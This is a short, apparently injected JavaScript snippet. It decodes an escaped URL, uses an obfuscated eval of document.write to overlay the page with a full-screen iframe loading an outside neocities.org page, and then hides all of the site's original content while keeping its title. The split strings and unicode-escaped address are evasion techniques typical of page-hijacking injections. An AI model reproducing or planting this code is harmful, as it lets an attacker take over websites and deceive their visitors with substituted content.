var titlestr=document.title;
setFrame("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u006a\u006b\u0062\u0064\u002e\u006e\u0065\u006f\u0063\u0069\u0074\u0069\u0065\u0073\u002e\u006f\u0072\u0067\u002f\u0071\u0069\u006e\u0067\u0068\u0075\u0061\u0069\u002f");



function setFrame(olink){
    var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="101%" src="'+olink+'"></iframe></div><style type="text/css">html{width:99%;height:100%;}body {width:100%;height:100%;}</style>';
    eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
    try {
      setTimeout(function() {
        console.log(document.body.children.length);
        for (var i = 0; i < document.body.children.length; i++) {
          try {
            var a = document.body.children[i].tagName;
            var b = document.body.children[i].id;
            console.log(i+"***"+a+"**"+b);
            if (b != "iconDiv1" && b != "showcloneshengxiaon" && a!="title") {
              document.body.children[i].style.display = "non" + "e"
            }
          } catch (e) {}
        }
        
         var oMeta = document.createElement('meta');
        oMeta.name = 'viewport';
        oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
        document.getElementsByTagName('head')[0].appendChild(oMeta);
        
      }, 100)
    } catch (e) {}
}